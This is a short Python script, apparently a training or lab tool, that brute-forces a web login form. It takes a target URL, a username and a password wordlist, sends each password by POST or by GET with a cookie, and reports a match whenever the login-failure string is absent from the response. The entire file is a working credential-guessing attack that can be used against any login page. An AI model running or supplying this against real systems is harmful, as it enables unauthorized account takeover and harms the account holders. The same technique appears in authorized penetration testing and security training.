import requests
from termcolor import  colored

url = input('[+] Enter Page Url: ')
username = input('[+] Enter username for the account to bruteforce: ')
password_file = input('[+] Enter the password file: ')
login_failed_string = input('[+] Enter login failed string: ')
cookie_value = input('[+] Enter cookie value(Optional): ')


def cracking(username, url):
    for password in passwords:
        password = password.strip()
        print(colored(f'Trying password: {password}','red'))
        data = {'username': username, 'password': password, 'Login': 'submit'}

        if cookie_value != '':
            response = requests.get(url, params={'username': username, 'password': password, 'Login': 'Login'},
                                    cookies={'Cookie': cookie_value})
        else:
            response = requests.post(url, data=data)

        if login_failed_string in response.content.decode():
            pass
        else:
            print(colored(f'[+] Found Username: ==> {username}','green'))
            print(colored(f'[+] Found password: ==> {password}','green'))
            exit()


with(open(password_file, 'r')) as passwords:
    cracking(username, url)

print('!!!Password not found !!!')
